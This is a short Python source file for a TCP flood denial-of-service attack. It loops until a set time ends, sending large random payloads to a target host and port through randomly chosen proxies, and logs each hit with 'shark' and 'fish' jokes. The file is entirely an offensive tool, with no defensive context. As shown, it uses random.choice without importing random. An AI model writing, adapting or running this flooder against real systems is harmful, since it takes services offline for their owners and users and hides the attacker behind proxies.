import socket
import time
from utils.client_utils import TcpClient
from utils.random_utils import random_string

def tcp_flood_attack(target, proxies, duration, packet_size):
    host, port = target.split(":")
    port = int(port)
    end_time = time.time() + duration
    while time.time() < end_time:
        proxy = random.choice(proxies)
        sock = TcpClient.create_socket(proxy)
        try:
            payload = random_string(packet_size * 1024)  
            sock.connect((host, port))
            sock.send(payload.encode())
            print(f"🦈 Shark sent TCP packet on fish: {host}:{port} by using proxy: {proxy['host']}:{proxy['port']}")
        except Exception as e:
            print(f"🐟 Oh No! The fish: {host}:{port} dodged the TCP packet frоm: {proxy['host']}:{proxy['port']} Get better proxies!: {e}")
        finally:
            sock.close()
